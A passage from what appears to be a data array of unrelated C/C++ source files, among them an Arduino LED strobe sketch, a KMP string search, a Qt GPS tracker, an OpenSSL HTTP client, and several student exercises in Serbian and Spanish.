waiting = false;\n\nuint8_t brightness = 200; // Default brightness = medium\nuint16_t brightnessChangeDelay = 200; // 200ms between brightness ticks\nuint16_t dutyCycleChangeDelay = 100; // 100ms between duty cycle ticks\n\nCRGB color;\nCRGB leds[NUM_LEDS];\n\n\n/**********************************************************\n * Apply gamma correction to a color value\n **********************************************************/\nuint8_t gamma(uint8_t val)\n{\n  uint16_t temp = uint16_t(pow(double(val) / 255.0, 2.7) * 255.0 + 0.5);\n  return temp > 255 ? 255 : (uint8_t)temp;  // Cap at 255\n}\n\n/*****************************************************************************************\n * Change brightness of LEDs\n * \n * @param bool increase - True if increasing brightness, False if decreasing brightness\n * @param uint8_t diff - The brightness difference you are changing the brightness by\n *****************************************************************************************/\nvoid changeBrightness(bool increase, uint8_t diff)\n{\n  byte minBrightness = 65;\n  byte maxBrightness = 255; // Need power control before I can go to 255\n\n  if (increase) {\n    brightness = ((brightness + diff) > maxBrightness) ? maxBrightness : qadd8(brightness, diff);\n  } else {\n    brightness = ((brightness - diff) < minBrightness) ? minBrightness : qsub8(brightness, diff);\n  }\n  \n  Serial.print(\"Brightness: \");\n  Serial.print((float)brightness / (float)maxBrightness * 100);\n  Serial.println(F(\"%\"));\n\n  FastLED.setBrightness(gamma(brightness));\n  FastLED.show();  \n\n  // Display brightness gauge, adjusted for minimum being greater than zero\n  /*\n  float brightnessPercent = (float)(brightness - minBrightness) / (float)(maxBrightness - minBrightness);\n  if (brightnessPercent < .1) {\n    brightnessPercent = .1;  // Set minimum percent to 10%\n  }\n  displayGauge(CRGB::Red, brightnessPercent);\n  delay(200); // Slow down the brightness change\n  displayAlert = true;\n  displayAlertTimer = millis();*/\n}\n\n\nvoid calculateFrames() {\n  // Calculate the onCycles and offCycles based on the frequency and duty cycle\n  //totalFrames = (uint8_t)(x / dutyCycle);  // Calculate the total number of frames required to accommdate the duty cycle\n  totalFrames = 1 / dutyCycle;  // Calculate the total number of frames required to accommdate the duty cycle\n    // totalFrames = 1 / .2 = 5\n  onFrames = totalFrames * dutyCycle; // 10 * .1 = 1\n\n  float strobeFrequency = fps / totalFrames;\n\n  Serial.print(F(\"Frames ON: \"));\n  Serial.println(onFrames);\n  Serial.print(F(\"TotalFrames: \"));\n  Serial.println(totalFrames);\n  Serial.print(F(\"Strobe Frequency: \"));\n  Serial.print(strobeFrequency);\n  Serial.println(F(\" Hz\"));\n}\n\nvoid setup() {\n  // Serial.begin(115200); // This baud rate is unavailable in Arduino IDE Serial Monitor for some reason\n  Serial.begin(9600); // Setting this baud rate so Ben can use Arduino IDE Serial Monitor\n  FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS);\n\n  FastLED.setBrightness(gamma(brightness)); // Set brightness to default value\n\n  // Initialize buttons\n  pinMode(BTN_1_PIN, INPUT_PULLUP);\n  pinMode(BTN_2_PIN, INPUT_PULLUP);\n  pinMode(BTN_3_PIN, INPUT_PULLUP);\n\n  calculateFrames();\n}\n\nvoid calcFrameRate() {\n  static int frameRateCycles = 1000;\n  static uint32_t timeElapsed = 0;\n  static uint32_t frameRateTimerStart = micros();\n\n  if (frameRateCycles > 0) {\n    frameRateCycles--;\n  }\n  else {\n    frameRateCycles = 1000;  // Reset\n    timeElapsed = micros() - frameRateTimerStart;\n    fps = 1000000 / (timeElapsed / frameRateCycles);\n    usPerFrame = timeElapsed / frameRateCycles;\n\n    frameRateTimerStart = micros();\n  }\n}\n\nvoid printFrameRate() {\n  Serial.print(fps); Serial.println(\" fps\");\n  Serial.print(usPerFrame); Serial.println(\"us/f\");\n}\n\nvoid changeD",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nvoid lpstable(int* lps, string pat, int m) {\n    int i = 1, j = 0;\n    while(i<m) {\n        if(pat[i]==pat[j]) {\n            lps[i] = ++j;\n            i++;\n        }\n        else{\n            if(j!=0){\n                j = lps[j-1];\n            }\n            else {\n                lps[i] = 0; i++;\n            }\n        }\n    }\n}\n\nvoid KMP(string text, string pat, int n, int m) {\n    int lps[m];\n    lps[0] = 0;\n    lpstable(lps, pat, m);\n    cout << \"LPS Table of \" << pat << \" is: \";\n    for(int i = 0; i<m; i++) {\n        cout << lps[i] << \" \";\n    }\n    cout << endl;\n    int i = 0, j = 0;\n    while(i<n) {\n        if( text[i]==pat[j]) {\n            i++,j++;\n            if(j==m) {\n                cout << \"Pattern Found at Index: \" << i - j << endl;\n                j = lps[j-1];\n            }\n        }\n        else{\n            if(j!=0) {\n                j = lps[j-1];\n            }\n            else i++;\n        }\n    }\n}\n\nint main() {\n    //freopen(\"in.txt\", \"r\", stdin);\n    string text, pat;\n    cout << \"Enter the Text: \";\n    getline(cin,text);\n    cout << \"Enter the Pattern: \";\n    getline(cin, pat);\n    int n = text.size(), m = pat.size();\n    cout << \"The length of the text: \" << n << endl;\n    cout << \"The length of the pattern: \" << m << endl;\n    KMP(text, pat, n, m);\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n// Created by User on 6/30/2024.\n//\n\n#include \"Bolnica.h\"\n\nostream& operator<<(ostream& os, const Bolnica& bolnica){\n    if(bolnica.pacijenti.empty()){\n        throw runtime_error(\"Vektor pacijenata je prazan\");\n    }\n\n    for (const auto& pacijent : bolnica.pacijenti) {\n        pacijent->prikaziDetalje();\n        os << endl;\n    }\n    return os;\n}\n\nistream& operator>>(istream& is,Bolnica& bolnica) {\n    string tipPacijenta;\n    cout << \"Unesite tip pacijenta(bolnicki/ambulantni):\";\n    is >> tipPacijenta;\n    is.ignore();\n\n    if (tipPacijenta == \"bolnicki\") {\n        string ime, prezime, dijagnoza, datumPrijema;\n        int starost, brSobe;\n        cout << \"Unesite ime: \";\n        getline(is, ime);\n        cout << \"Unesite prezime: \";\n        getline(is, prezime);\n        cout << \"Unesite starost: \";\n        is >> starost;\n        is.ignore(); // Clear the newline character left in the input buffer\n        cout << \"Unesite dijagnozu: \";\n        is >> dijagnoza;\n        cout << \"Unesite broj sobe: \";\n        is >> brSobe;\n        is.ignore(); // Clear the newline character left in the input buffer\n        cout << \"Unesite datum prijema: \";\n        getline(is, datumPrijema);\n        bolnica.pacijenti.push_back(make_shared<BolnickiPacijent>(ime, prezime, starost, dijagnoza, brSobe, datumPrijema));\n    } else if (tipPacijenta == \"ambulantni\") {\n        string ime, prezime, dijagnoza, datumPregleda, imeDoktora;\n        int starost;\n        cout << \"Unesite ime: \";\n        getline(is, ime);\n        cout << \"Unesite prezime: \";\n        getline(is, prezime);\n        cout << \"Unesite starost: \";\n        is >> starost;\n        is.ignore(); // Clear the newline character left in the input buffer\n        cout << \"Unesite dijagnozu: \";\n        getline(is, dijagnoza);\n        cout << \"Unesite datum pregleda: \";\n        getline(is, datumPregleda);\n        cout << \"Unesite ime doktora: \";\n        getline(is, imeDoktora);\n        bolnica.pacijenti.push_back(make_shared<AmbulantniPacijent>(ime, prezime, starost, dijagnoza, datumPregleda, imeDoktora));\n    } else {\n        throw invalid_argument(\"Nepoznat tip pacijenta.\");\n    }\n}\n\n\nstd::shared_ptr<Pacijent> Bolnica::operator!() const {\n    if(pacijenti.empty()){\n        throw runtime_error(\"Vektor prazan!\");\n    }\n\n    shared_ptr<Pacijent> najstariji = pacijenti[0];\n    for(auto& pacijent : pacijenti){\n        if(pacijent->getStarost() > najstariji->getStarost()){\n            najstariji = pacijent;\n        }\n    }\n    return najstariji;\n}",
    "#include \"ImageManipulator.hpp\"\n#include <iostream>\n\n/**\n * @file main.cpp\n * @brief Demonstrates the usage of the Image class by creating and manipulating PPM images.\n * \n * This project is created and maintained by Yash Dhone (yashdhone-09).\n */\n\n/**\n * @brief Main function that creates and manipulates several PPM images.\n * \n * This function creates an image, applies several manipulations to it, and saves the results as PPM files.\n * \n * @return int Returns 0 if the program completes successfully.\n */\nint main() {\n    // Create an image with dimensions 100x100\n    Image img(100, 100);\n\n    // Fill the image with a gradient\n    auto& pixels = img.getPixels();\n    for (int y = 0; y < 100; ++y) {\n        for (int x = 0; x < 100; ++x) {\n            pixels[y][x] = { static_cast<int>(x * 2.55), static_cast<int>(y * 2.55), 127 }; // A simple gradient\n        }\n    }\n\n    // Save the original gradient image\n    if (!img.save(\"gradient.ppm\")) {\n        std::cerr << \"Failed to save gradient.ppm\" << std::endl;\n    }\n\n    // Convert to grayscale and save\n    img.toGrayscale();\n    if (!img.save(\"gradient_grayscale.ppm\")) {\n        std::cerr << \"Failed to save gradient_grayscale.ppm\" << std::endl;\n    }\n\n    // Invert colors and save\n    img.invertColors();\n    if (!img.save(\"gradient_inverted.ppm\")) {\n        std::cerr << \"Failed to save gradient_inverted.ppm\" << std::endl;\n    }\n\n    // Rotate by 90 degrees and save\n    img.rotate(90);\n    if (!img.save(\"gradient_rotated_90.ppm\")) {\n        std::cerr << \"Failed to save gradient_rotated_90.ppm\" << std::endl;\n    }\n\n    // Adjust brightness and save\n    img.adjustBrightness(50);\n    if (!img.save(\"gradient_brightened.ppm\")) {\n        std::cerr << \"Failed to save gradient_brightened.ppm\" << std::endl;\n    }\n\n    std::cout << \"PPM images created successfully.\" << std::endl;\n     Image apolloImage;\n    if (!apolloImage.load(\"apollo.ppm\")) {\n        std::cerr << \"Failed to load apollo.ppm\" << std::endl;\n        return 1;\n    }\n\n    Image landscapeImage;\n    if (!landscapeImage.load(\"landscape.ppm\")) {\n        std::cerr << \"Failed to load landscape.ppm\" << std::endl;\n        return 1;\n    }\n\n    // Invert images laterally\n    invertLaterally(apolloImage);\n    invertLaterally(landscapeImage);\n\n    // Save modified images\n    if (!apolloImage.save(\"apollo_inverted.ppm\")) {\n        std::cerr << \"Failed to save apollo_inverted.ppm\" << std::endl;\n        return 1;\n    }\n\n    if (!landscapeImage.save(\"landscape_inverted.ppm\")) {\n        std::cerr << \"Failed to save landscape_inverted.ppm\" << std::endl;\n        return 1;\n    }\n\n    std::cout << \"Images inverted laterally and saved successfully.\" << std::endl;\n        return 0;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <windows.h>\r\n\r\nusing namespace std;\r\n\r\nint question_num;\r\nint level;\r\nint type;\r\nint q_right = 0;\r\nint q_wrong = 0;\r\nbool ans = true;\r\n\r\nvoid readinformation() {\r\n    cout << \"How many questions do you want to answer? \";\r\n    cin >> question_num;\r\n    cout << \"\\n\\n\";\r\n\r\n    cout << \"What is the level you want to answer? [1] easy, [2] middle, [3] hard, [4] mix? \";\r\n    cin >> level;\r\n    cout << \"\\n\\n\";\r\n\r\n    cout << \"What is the type you want to answer? [1] add, [2] sub, [3] mult, [4] div, [5] mix? \";\r\n    cin >> type;\r\n    cout << \"\\n\\n\";\r\n}\r\n\r\nvoid type_function() {\r\n    int num1, num2;\r\n    for (int i = 1; i <= question_num; i++) {\r\n        cout << \"Question [ \" << i << \" / \" << question_num << \" ] \\n\\n\";\r\n\r\n        // Set the number ranges based on the level\r\n        switch (level) {\r\n        case 1:\r\n            num1 = rand() % 10;\r\n            num2 = rand() % 10;\r\n            break;\r\n        case 2:\r\n            num1 = rand() % 100;\r\n            num2 = rand() % 100;\r\n            break;\r\n        case 3:\r\n            num1 = rand() % 1000;\r\n            num2 = rand() % 1000;\r\n            break;\r\n        case 4:\r\n            num1 = rand() % 200;\r\n            num2 = rand() % 200;\r\n            break;\r\n        }\r\n\r\n        int result;\r\n\r\n        switch (type) {\r\n        case 1:\r\n            cout << num1 << \" + \" << num2 << \" = \";\r\n            cin >> result;\r\n            if (result != (num1 + num2)) {\r\n                cout << \"Wrong Answer : (-\\n\";\r\n                cout << \"The right answer: \" << (num1 + num2) << \"\\n\";\r\n                system(\"color 4E\");\r\n                Beep(500, 1500);\r\n                q_wrong++;\r\n            }\r\n            else {\r\n                q_right++;\r\n                cout << \"Right Answer : -)\\n\";\r\n                system(\"color 2F\"); // green\r\n            }\r\n            cout << \"\\n\\n\";\r\n            break;\r\n\r\n        case 2:\r\n            cout << num1 << \" - \" << num2 << \" = \";\r\n            cin >> result;\r\n            if (result != (num1 - num2)) {\r\n                cout << \"Wrong Answer : (-\\n\";\r\n                cout << \"The right answer: \" << (num1 - num2) << \"\\n\";\r\n                system(\"color 4E\");\r\n                Beep(500, 1500);\r\n                q_wrong++;\r\n            }\r\n            else {\r\n                cout << \"Right Answer : -)\\n\";\r\n                system(\"color 2F\"); // green\r\n                q_right++;\r\n            }\r\n            cout << \"\\n\\n\";\r\n            break;\r\n\r\n        case 3:\r\n            cout << num1 << \" * \" << num2 << \" = \";\r\n            cin >> result;\r\n            if (result != (num1 * num2)) {\r\n                cout << \"Wrong Answer : (-\\n\";\r\n                cout << \"The right answer: \" << (num1 * num2) << \"\\n\";\r\n                system(\"color 4E\");\r\n                Beep(500, 1500);\r\n                q_wrong++;\r\n            }\r\n            else {\r\n                cout << \"Right Answer : -)\\n\";\r\n                system(\"color 2F\"); // green\r\n                q_right++;\r\n            }\r\n            cout << \"\\n\\n\";\r\n            break;\r\n\r\n        case 4:\r\n            if (num2 == 0) num2 = 1; // Avoid division by zero\r\n            cout << num1 << \" / \" << num2 << \" = \";\r\n            cin >> result;\r\n            if (result != (num1 / num2)) {\r\n                cout << \"Wrong Answer : (-\\n\";\r\n                cout << \"The right answer: \" << (num1 / num2) << \"\\n\";\r\n                system(\"color 4E\");\r\n                Beep(500, 1500);\r\n                q_wrong++;\r\n            }\r\n            else {\r\n                cout << \"Right Answer : -)\\n\";\r\n                system(\"color 2F\"); // green\r\n                q_right++;\r\n            }\r\n            cout << \"\\n\\n\";\r\n            break;\r\n\r\n        case 5:\r\n            // For mix type, generate a random operation\r\n            int op = rand() % 4 + 1;\r\n            switch (op) {\r\n            case 1:\r\n                cout << num1 << \" + \" << num2 << \" = \";\r\n                cin >> result;\r\n                if (result != (num1 + num2)) {\r\n                    cout << \"Wrong Answer : (-\\n\";\r\n                    cout << \"The right answer: \" << (num1 + num2) << \"\\n\";\r\n                    system(\"color 4E\");\r\n                    Beep(500, 1500);\r\n                    q_wrong++;\r\n                }\r\n                else {\r\n                    cout << \"Right Answer : -)\\n\";\r\n                    system(\"color 2F\"); // green\r\n                    q_right++;\r\n                }\r\n                break;\r\n\r\n            case 2:\r\n                cout << num1 << \" - \" << num2 << \" = \";\r\n                cin >> result;\r\n                if (result != (num1 - num2)) {\r\n                    cout << \"Wrong Answer : (-\\n\";\r\n                    cout << \"The right answer: \" << (num1 - num2) << \"\\n\";\r\n                    system(\"color 4E\");\r\n                    Beep(500, 1500);\r\n                    q_wrong++;\r\n                }\r\n                else {\r\n                    cout << \"Right Answer : -)\\n\";\r",
    "//\n// Created by tconto on 7/4/24.\n//\n\n#include \"http.hpp\"\n\n#include <iostream>\n#include <openssl/ssl.h>\n#include <openssl/err.h>\n#include \"strings.hpp\"\n#include <netdb.h>\n#include <unistd.h>\n\n// Marshal the response into an response object\nstd::string http::parse_chunked_body(const std::vector<std::string>& lines, const size_t start_index) {\n    std::string body;\n    size_t i = start_index;\n    while (i < lines.size()) {\n        // Read the chunk size\n        std::string chunk_size_line = lines.at(i++);\n        if (chunk_size_line.empty()) continue;  // Skip any empty lines\n\n        // Convert the chunk size from hex to integer\n        size_t chunk_size = std::stoul(chunk_size_line, nullptr, 16);\n        if (chunk_size == 0) break;  // Last chunk (0) indicates end of body\n\n        // Read the chunk data\n        body.append(lines.at(i++).substr(0, chunk_size));\n\n        // Skip the CRLF after the chunk\n        if (i < lines.size() && lines.at(i).empty()) {\n            i++;\n        }\n    }\n    return body;\n}\n\nhttp::response http::parse_response(const std::string& response) {\n    http::response res;\n    std::vector<std::string> lines = split(response, \"\\r\\n\");\n\n    // Parse the status line\n    std::vector<std::string> statusLine = split(lines.at(0), \" \");\n    res.status = std::stoi(statusLine.at(1));\n\n    // Parse the headers\n    size_t i = 1;\n    for (; i < lines.size(); i++) {\n        std::string line = lines.at(i);\n        if (line.empty()) {\n            // The body starts after the headers\n            i++;\n            break;\n        }\n\n        std::vector<std::string> parts = split(line, \": \");\n        res.headers[parts.at(0)] = parts.at(1);\n    }\n\n    // Check for Transfer-Encoding: chunked\n    if (res.headers.find(\"Transfer-Encoding\") != res.headers.end() &&\n        res.headers[\"Transfer-Encoding\"] == \"chunked\") {\n        // Parse the chunked body\n        res.body = parse_chunked_body(lines, i);\n        } else {\n            // If not chunked, the rest is the body\n            for (; i < lines.size(); i++) {\n                res.body += lines.at(i);\n                if (i != lines.size() - 1) {\n                    res.body += \"\\r\\n\";\n                }\n            }\n        }\n\n    return res;\n}\nstd::pair<int, http::response> http::make_ssl_request(const std::string& hostName, const std::string& path, int port) {\n    SSL_library_init();\n    SSL_load_error_strings();\n    SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());\n\n    addrinfo hints{}, *res;\n    hints.ai_family = AF_INET; // IPv4\n    hints.ai_socktype = SOCK_STREAM; // TCP\n\n    if (getaddrinfo(hostName.c_str(), nullptr, &hints, &res) != 0) {\n        std::cerr << \"Failed to resolve hostname\\n\";\n        return {1, response{}};\n    }\n\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        std::cerr << \"Error creating sock\\n\";\n        return {1, response{}};\n    }\n\n    sockaddr_in serverAddress{};\n    serverAddress.sin_family = AF_INET;\n    serverAddress.sin_port = htons(port);\n    serverAddress.sin_addr = reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr;\n\n    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) < 0) {\n        std::cerr << \"Failed to connect to the server\\n\";\n        return {1, response{}};\n    }\n\n    SSL *ssl = SSL_new(ctx);\n    SSL_set_fd(ssl, sock);\n    SSL_set_tlsext_host_name(ssl, hostName.c_str());\n    SSL_set1_host(ssl, hostName.c_str());\n\n    if (SSL_connect(ssl) <= 0) {\n        std::cerr << \"SSL connection failed\\n\";\n        ERR_print_errors_fp(stderr);\n        return {1, response{}};\n    }\n\n    // Build an HTTPS request\n    std::string request = \"GET \" + path + \" HTTP/1.1\\r\\nHost: \" + std::string(hostName) + \"\\r\\nConnection: close\\r\\n\\r\\n\";\n    if (SSL_write(ssl, request.c_str(), request.size()) <= 0) {\n        std::cerr << \"Failed to send request\\n\";\n        return {1, response{}};\n    }\n\n    // Receive response\n    char buffer[4096] = {};\n    std::string response;\n    int bytesRecv;\n\n    do {\n        bytesRecv = SSL_read(ssl, buffer, sizeof(buffer));\n        if (bytesRecv > 0) {\n            response.append(buffer, bytesRecv);\n        }\n    } while (bytesRecv > 0);\n\n    SSL_free(ssl);\n    close(sock);\n    SSL_CTX_free(ctx);\n\n    http::response parsedResponse = parse_response(response);\n\n\n    return {0, parsedResponse};\n}\n\nstd::pair<int, http::response>  http::make_request(const std::string& hostName, const std::string& path, int port) {\n    addrinfo hints{}, *res;\n    hints.ai_family = AF_INET; // IPv4\n    hints.ai_socktype = SOCK_STREAM; // TCP\n\n    if (getaddrinfo(hostName.c_str(), nullptr, &hints, &res) != 0) {\n        std::cerr << \"Failed to resolve hostname\\n\";\n        return {1, response{}};\n    }\n\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        std::cerr << \"Error creating sock\\n\";\n        return {1, response{}};\n    }\n\n    sockaddr_in serverAddress{};\n    serverAddress.sin_family = AF_INET;\n    serverAddress.sin_port = htons(port);\n ",
    "#include \"gpsmain.h\"\n#include \"ui_gpsmain.h\"\n#include \"../../JalaliDate/qdatejalali.h\"\n\nGPSMain::GPSMain(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::GPSMain)\n{\n    QApplication::setApplicationVersion(QString(\"2.0.0\"));\n    QApplication::setApplicationDisplayName(QString(\"GP Control\"));\n    LocationWindow = NULL;\n    QompWindow = NULL;\n\n    Qompass = new QAction(\"&Qompass\",this);\n    Qompass->setEnabled(false);\n\n    Equipment = menuBar()->addMenu(\"&Equipment\");\n    Equipment->addAction(Qompass);\n    connect(Qompass,&QAction::triggered,this,&GPSMain::on_Qompass_clicked);\n\n    LocationNumber = 0;\n    this->setFixedSize(this->geometry().width(),this->geometry().height());\n\n    QStringList systemEnvironment = QProcess::systemEnvironment();\n    foreach (QString Str, systemEnvironment) {\n        //QMessageBox::about(this,QString(\"System Environment\"),QString(\"Data : %1\").arg(Str));\n        if(Str.contains(\"EXTERNAL_STORAGE=\"))\n        {\n            Str.remove(\"EXTERNAL_STORAGE=\");\n            Path = Str;\n            break;\n        }\n    }\n    trackerPath = Path;\n    Path = QString(\"%1/gps.db\").arg(Path);\n    //Path = QString(\"/storage/emulated/gps.db\").arg(Path);\n    //QMessageBox::about(this,QString(\"GPS Path\"),QString(\"Data : %1\").arg(Path));\n    LogFile = new QFile(Path);\n    //LogTextStream = new QTextStream(LogFile);\n    //LogTextStream->setCodec(\"UTF-8\");\n    //----------------------Position Info\n    QgeoPositionInfoSource = QGeoPositionInfoSource::createDefaultSource(this);\n    if(QgeoPositionInfoSource)\n    {\n        QgeoPositionInfoSource->setPreferredPositioningMethods(QGeoPositionInfoSource::AllPositioningMethods);\n        connect(QgeoPositionInfoSource,SIGNAL(error(QGeoPositionInfoSource::Error)),this\n                ,SLOT(error(QGeoPositionInfoSource::Error)));\n        connect(QgeoPositionInfoSource,SIGNAL(positionUpdated(QGeoPositionInfo)),this\n                ,SLOT(setGPSLocation(QGeoPositionInfo)));\n        QgeoPositionInfoSource->setUpdateInterval(100);\n        QgeoPositionInfoSource->startUpdates();\n    }\n    else\n    {\n        QMessageBox::warning(this,\"Error\",\"Qt Position Can Not Start .\");\n    }\n\n    //----------------------Satellite Info\n    QgeoSatelliteInfoSource = QGeoSatelliteInfoSource::createDefaultSource(this);\n    if(QgeoSatelliteInfoSource)\n    {\n        connect(QgeoSatelliteInfoSource,SIGNAL(error(QGeoSatelliteInfoSource::Error)),this\n                ,SLOT(error(QGeoSatelliteInfoSource::Error)));\n        connect(QgeoSatelliteInfoSource,SIGNAL(satellitesInViewUpdated(QList<QGeoSatelliteInfo>)),this\n                ,SLOT(satellitesInViewUpdated(QList<QGeoSatelliteInfo>)));\n        connect(QgeoSatelliteInfoSource,SIGNAL(satellitesInUseUpdated(QList<QGeoSatelliteInfo>)),this\n                ,SLOT(satellitesInUseUpdated(QList<QGeoSatelliteInfo>)));\n        QgeoSatelliteInfoSource->setUpdateInterval(100);\n        QgeoSatelliteInfoSource->requestUpdate(6000);\n        QgeoSatelliteInfoSource->startUpdates();\n    }\n    else\n    {\n        QMessageBox::warning(this,\"Error\",\"Qt Satellite Can Not Start .\");\n    }\n    InUse = InView = 0;\n    SatSet = false;\n    Direction = \"nan\";\n    ui->setupUi(this);\n    ChangeBtnState(false);\n    changelocationNameBar(false);\n\n    trackerTimer = new QTimer(this);\n    connect(trackerTimer,&QTimer::timeout,this,&GPSMain::on_trackerTimer_Timeout);\n    trackerTimer->stop();\n\n    connect(ui->DspbTracker,static_cast<void (QDoubleSpinBox::*)(double)>(&QDoubleSpinBox::valueChanged),this,&GPSMain::on_DspbTracker_valuechanged);\n\n    connect(ui->BtnTracker,&QPushButton::clicked,this,&GPSMain::on_BtnTracker_Clicked);\n\n    trackerFile = new QFile(this);\n}\n\nGPSMain::~GPSMain()\n{\n    delete ui;\n}\n\nQString GPSMain::SatelliteType(int StType)\n{\n    switch (StType) {\n    case QGeoSatelliteInfo::GLONASS:\n        return \"GLONASS\";\n        break;\n    case QGeoSatelliteInfo::GPS:\n        return \"GPS\";\n        break;\n    default:\n        return QString(\"OTHER.%1\").arg(StType);\n        break;\n    }\n}\n\nQString GPSMain::DirectionSet(QString _Data)\n{\n    double Drc = _Data.toDouble();\n    emit QompassChange(int(Drc));\n    if(Drc >= 350 || Drc <= 10)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"N\");\n    }\n    else if(Drc > 10 && Drc < 80)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"NE\");\n    }\n    else if(Drc >= 80 && Drc <= 100)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"E\");\n    }\n    else if(Drc > 100 && Drc < 170)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"SE\");\n    }\n    else if(Drc >= 170 && Drc <= 190)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"S\");\n    }\n    else if(Drc > 190 && Drc < 260)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"SW\");\n    }\n    else if(Drc >= 260 && Drc <= 280)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"W\");\n    }\n    else if(Drc > 280 && Drc < 350)\n    {\n        return QString(\"%1\\tDir:%2\").arg(Drc).arg(\"NW\");\n    }\n    else\n    {\n        return QStrin",
    "// Autor: Axel Molineros\n// Fecha:03-07-2024\n// 4) Dise\u00f1e la funci\u00f3n que calcula la sumatoria de N elementos enteros almacenados en un vector.\n// Tambi\u00e9n dise\u00f1e la funci\u00f3n que calcule el promedio de esos elementos.\n\n#include <iostream>\nusing namespace std;\n\nint MAX = 100; //Tama\u00f1o maximo del vector\n\n//Para calcular la suma de los elementos del vector//\nint SumaEnteros ( int vec[], int size){\n    int suma = 0;\n    for ( int i = 0; i < size; i++){\n        suma += vec[i];\n    }\n    return suma; \n}\n\n//Calcula el promedio de los elementos almacenados//\ndouble PromedioEnteros ( int vec[], int size){\n    if ( size == 0){\n        return 0;  //Retorna 0 si el vector no tiene nada para evitar la division para 0\n    }\n    double promedio = (SumaEnteros(vec, size) * 1.0) / size;\n    return promedio;\n    \n}\n\nint main (){\n    int vec[] = { 21, 10, 8, 5, 6, 21, 35, 18, 25};\n\n    //Calcula y muestra la suma de los elementos\n    int suma = SumaEnteros(vec, sizeof(vec) / sizeof (vec[0]));\n    cout<<endl<<\"La suma de los elementos es: \"  << suma;\n\n    //Calcula y muestra el promedio de los elementos\n    double promedio = PromedioEnteros(vec, sizeof(vec) / sizeof (vec[0]));\n    cout<<endl<<\"El promedio de los elementos es: \" << promedio;\n\n return 0;\n}",
    "// If the numbers to are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.\n \n// If all the numbers from 1 to 1000 (one thousand) inclusive were written out in words, how many letters would be used?\n \n \n// NOTE: Do not count spaces or hyphens. For example, 342 (three hundred and forty-two) contains 23 letters and 115 (one hundred and fifteen contains 20 letters. The use of \"and\" when writing out numbers is in compliance with British usage.\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nint main()\n{\n     map<int, string> mp = {{1 , \"one\"}, {2,\"two\"}, {3,\"three\"}, {4,\"four\"}, {5,\"five\"}, {6,\"six\"}, {7,\"seven\"}, {8,\"eight\"},{9,\"nine\"}, {10,\"ten\"}, {11,\"eleven\"}, {12,\"twelve\"}, {13,\"thirteen\"}, {14,\"fourteen\"}, {15,\"fifteen\"}, {16,\"sixteen\"}, {17,\"seventeen\"}, {18,\"eighteen\"}, {19,\"nineteen\"}, {20,\"twenty\"}, {30,\"thirty\"}, {40,\"fourty\"}, {50,\"fifty\"}, {60,\"sixty\"}, {70,\"seventy\"}, {80,\"eighty\"},{ 90,\"ninty\"}};\n    \n    int n;\n    cin>>n;\n    if(n == 1000){\n        cout<<11<<endl;\n        return 0;\n    }\n    \n    int letters_used = 0, cnt = 0;\n    if(mp.find(n) != mp.end()){\n        letters_used += mp[n].size();\n        cout<<letters_used;\n        return 0;\n    }\n    int last_two = n % 100;\n    if(mp.find(last_two) != mp.end()){\n        letters_used += mp[last_two].size();\n    }else{\n        int t = last_two;\n        int unitPlace = t % 10;\n        t = t / 10;\n        int tenPlace = t % 10;\n        tenPlace = tenPlace * 10;\n        letters_used += mp[unitPlace].size();\n        letters_used += mp[tenPlace].size();\n    }\n    \n    n = n / 100;\n    if(n > 0){\n        cnt++;\n        letters_used += mp[n].size();\n        letters_used += 7;  // hundred\n    }\n    \n    if(cnt > 0)  // 3 digit number\n        letters_used += 3;  // handling case when \"and\" is used\n    cout<<letters_used<<endl;\n    return 0;\n}",
